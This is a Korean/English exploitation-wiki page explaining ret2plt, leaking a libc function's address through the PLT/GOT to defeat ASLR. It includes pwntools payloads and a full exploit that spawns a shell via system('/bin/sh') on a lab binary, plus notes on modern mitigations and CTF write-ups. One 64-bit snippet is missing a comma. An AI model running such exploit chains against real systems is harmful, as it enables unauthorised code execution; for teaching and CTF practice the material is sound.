# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

이 기법의 목적은 **PLT의 함수에서 주소를 leak**하여 ASLR을 우회하는 것입니다. 예를 들어 `libc`에서 함수 `puts`의 주소를 leak하면, 그 후 **`libc`의 베이스가 어디인지 계산할 수 있으며** 다른 함수들(예: **`system`**)에 접근하기 위한 offsets를 계산할 수 있습니다.

이것은 `pwntools` payload로 다음과 같이 할 수 있습니다 ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
**`puts`**가 (PLT의 주소를 사용하여) GOT (Global Offset Table)에 위치한 `puts`의 주소로 호출되는 것을 주목하라. 이는 `puts`가 puts의 GOT 엔트리를 출력할 시점에는 이 **엔트리가 메모리 상의 `puts`의 정확한 주소를 포함하고 있기 때문**이다.

또한 익스플로잇에서 `main`의 주소가 사용되어 `puts`가 실행을 마친 후 **binary가 종료하지 않고 `main`을 다시 호출**한다는 점을 주목하라(따라서 leaked address가 계속 유효하다).

> [!CAUTION]
> 이 기법이 작동하려면 **binary가 PIE로 컴파일되어서는 안 된다**거나 PLT, GOT 및 main의 주소를 알기 위해 **PIE를 우회하기 위한 leak을 찾아야** 한다는 점에 유의하라. 그렇지 않으면 먼저 PIE를 우회해야 한다.

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). 이것은 그 **example**의 최종 익스플로잇이었다:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Modern considerations

- **`-fno-plt` builds** (common in modern distros) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) to jump into libc once lazy binding has completed.
- **Full RELRO / `-Wl,-z,now`**: GOT is read‑only but ret2plt still works for leaks because you only read the GOT slot. If the symbol was never called, your first ret2plt will also perform lazy binding and then print the resolved slot.
- **ASLR + PIE**: if PIE is enabled, first leak a code pointer (e.g., saved return address, function pointer, or `.plt` entry via another format‑string/infoleak) to compute the PIE base, then build the ret2plt chain with the rebased PLT/GOT addresses.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries are valid BTI landing pads (`bti c`), so when exploiting on BTI‑enabled binaries prefer jumping into the PLT stub (or another BTI‑annotated gadget) instead of directly into a libc gadget without BTI, otherwise the CPU will raise `BRK`/`PAC` failures.
- **Quick resolution helper**: if the target function is not yet resolved and you need a leak in a single shot, chain the PLT call twice: first `elf.plt['foo']` (to resolve) then again `elf.plt['foo']` with the GOT address as argument to print the now‑filled slot.

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, 첫 단계는 canary의 0x00 바이트까지 overflow를 채워서 puts를 호출해 그것을 leak하는 것입니다. canary를 알게 되면 puts의 주소를 GOT에서 leak하기 위해 puts를 호출하는 ROP gadget을 만들고, 그 다음 `system('/bin/sh')`를 호출하는 ROP gadget을 사용합니다.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, child 함수로부터 main에서 발생하는 stack overflow. puts를 호출해 GOT에서 puts의 주소를 leak하는 ROP gadget을 만든 다음 one gadget을 호출합니다.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
